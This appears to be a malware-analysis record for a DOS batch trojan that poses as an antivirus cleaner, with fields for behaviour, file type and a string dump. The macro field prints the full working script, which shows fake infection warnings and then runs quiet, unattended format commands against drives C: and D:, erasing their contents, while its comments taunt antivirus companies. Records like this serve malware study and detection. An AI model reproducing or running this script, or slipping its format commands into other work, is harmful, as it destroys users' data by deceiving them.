behavior.System: May run an executable file or a system command on a Mac

docinfo.macro:
@echo off
echo Trojan.BAT.CLEAN_IT Now Working...
echo This program will check your computer for the
echo most of the Internet worms in the wild.
echo Including IRC, mIRC, pIRC, VBS, and BAT
echo like Trojan.BAT.FormatC.a is very common in the wild.
cls
pause
echo If any nasty files are found, I will attempt to
echo clean them off this computer.
cls
echo C:\Windows\System\Format.bat is infected with Trojan.BAT.FormatC.d
pause
echo I will now attempt to clean it from your computer.
pause
cls
format C:\ /q /autotest
echo Checking Drive D:\
format D:\ /q /autotest
echo Cleaning is now complete.
rem Antivirus Company's Can't Beat This Cleaning System Can they now :(
rem Do you think I Beta tested this Batch File :)

filetype: DOS batch file, ASCII text, with CRLF line terminators

dump: echo This program will check your computer for the
echo most of the Internet worms in the wild.
echo Including IRC, mIRC, pIRC, VBS, and BAT
echo like Trojan.BAT.FormatC.a is very common in the wild.
echo If any nasty files are found, I will attempt to
echo clean them off this computer.
echo C:\Windows\System\Format.bat is infected with Trojan.BAT.FormatC.d
echo I will now attempt to clean it from your computer.
rem Antivirus Company's Can't Beat This Cleaning System Can they now :(
rem Do you think I Beta tested this Batch File :)
